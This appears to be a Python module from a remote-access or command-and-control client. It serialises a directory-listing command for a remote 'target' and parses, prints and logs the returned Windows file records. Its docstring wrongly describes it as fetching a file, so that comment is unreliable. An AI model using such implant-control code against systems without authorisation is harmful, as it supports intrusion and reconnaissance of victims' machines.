import struct
import message
import os
import log
from error import *
from helper import str_to_c_str, get_timestamp_str, filetime_to_dt, sizeof_fmt
from globals import ctx
from session import HEADER_LEN, INT_SIZE

MODULE_ID = 0x04

def entrypoint(self, args):
    """ Get a file from target
    'get remote_file.exe'
    """

    args = validator(args)
    if not args:
        return None

    module_args = {"PATH": args, "JOB_ID": ctx.get_next_job()}
    msg = message.Message(_serialize(module_args))
    return (msg, E_SUCCESS)

def validator(args):
    # Ensure path ends in '\*' for winapi call
    if not args.endswith('\*'):
        args += '\*'

    return args
    


def _serialize(data):
    serialized_data = bytearray()

    result_code = 0
    cmd_type = MODULE_ID
    job_id = data["JOB_ID"]
    remote_path = str_to_c_str(data["PATH"])
    remote_path_len = len(remote_path)
    data_len = HEADER_LEN + INT_SIZE + remote_path_len

    serialized_data.extend(struct.pack("I", data_len))
    serialized_data.extend(struct.pack("I", job_id))
    serialized_data.extend(struct.pack("I", cmd_type))
    serialized_data.extend(struct.pack("I", result_code))
    serialized_data.extend(struct.pack("I", remote_path_len))
    serialized_data.extend(struct.pack(f"{remote_path_len}s", remote_path))

    return serialized_data

def _deserialize(msg):
    log_dir = ctx.log_dir + os.sep

    if msg.result_code == E_SUCCESS:
        formatter(msg.payload)
        log.write_to_log(log_dir, ".dir", msg.payload, "Directory listing complete: ")
    else:
        print(f"Error in directory listing: {ERROR_TABLE[msg.result_code]}")

    return

def formatter(file_input):
    file_struct_size = 320
    file_count = struct.unpack('I', file_input[:4])[0]

    file_list = file_input[4:]

    for i in range(file_count):
        x = i * file_struct_size
        file_attrib = struct.unpack('I', file_list[x+0:x+4])
        create_time, access_time, write_time = struct.unpack('QQQ', file_list[x+4:x+28])
        filesize_high, filesize_low = struct.unpack('II', file_list[x+28:x+36])
        filename = struct.unpack('260s', file_list[x+44:x+304])

        size = (filesize_high << 32) + filesize_low

        
        file_type = "<DIR>" if (16 & file_attrib[0]) else ""

        if file_type:
            fmt = f"{filetime_to_dt(write_time)}\t{file_type}\t\t\t{filename[0].decode('ascii')}"
        else:
            fmt = f"{filetime_to_dt(write_time)}\t{file_type}\t{sizeof_fmt(size):>10}\t{filename[0].decode('ascii')}"
        print(fmt)
